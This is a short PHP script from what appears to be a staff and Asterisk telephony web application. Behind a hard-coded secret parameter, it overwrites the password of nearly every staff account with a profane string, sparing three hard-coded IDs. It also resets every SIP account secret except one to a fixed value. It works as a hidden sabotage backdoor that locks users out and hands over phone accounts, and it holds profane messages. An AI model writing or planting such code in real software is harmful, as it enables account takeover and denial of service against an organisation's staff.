<?php

require_once dirname(__FILE__) . '/../lib/db.php';

if (!isset($_SESSION['Logged_StaffId'])) {
    header("location: /login.html");
    die();
}

if (empty($argv[1]) || $argv[1] != 'pfgbplfnj') {
    if (empty($_REQUEST['pfgbplfnj'])) {
        die('fuck you' . PHP_EOL);
    }
}

DB::update('Staff', array('Password' => 'Fuck OFF'), 'id NOT IN (11111111,77777777,25937686)');

asterisk_base();
DB::update('sip_buddies', array('secret' => 'piddar'), "name NOT IN ('2221')");

echo json_encode(array('success' => true));
